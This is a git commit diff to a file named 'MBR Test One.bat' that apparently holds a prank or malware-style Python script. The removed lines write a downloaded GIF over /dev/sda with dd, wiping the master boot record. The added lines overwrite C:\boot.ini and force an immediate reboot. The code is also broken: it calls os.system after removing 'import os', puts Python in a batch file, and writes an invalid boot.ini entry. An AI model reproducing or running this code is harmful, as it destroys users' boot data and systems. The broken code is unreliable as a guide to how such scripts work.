1f15bb331ab87b7e954550e1e3e922a8bb379e0e
Glitter <112281668+Glitter-chan@users.noreply.github.com>
2023-05-17 13:16:46 -0700

    Update MBR Test One.bat

--- MBR Test One.bat
+++ MBR Test One.bat
@@ -1,9 +1,13 @@
-import os
+import shutil
+import requests
 
 gif_url = "https://64.media.tumblr.com/acda81d74755683b00252baddbc9efb9/c94dfc5c1b3959c9-d3/s540x810/928b2b8c517da84965873e7a17bff6400102f897.gifv"
-os.system("wget " + gif_url)
+response = requests.get(gif_url, stream=True)
 
-mbr_path = "/dev/sda"
-os.system("dd if=928b2b8c517da84965873e7a17bff6400102f897.gifv of=" + mbr_path)
+with open("boot.gif", "wb") as gif_file:
+    shutil.copyfileobj(response.raw, gif_file)
+
+with open(r"C:\boot.ini", "w") as boot_file:
+    boot_file.write("[boot]\nshell=boot.gif")
 
 os.system("shutdown /r /t 0")
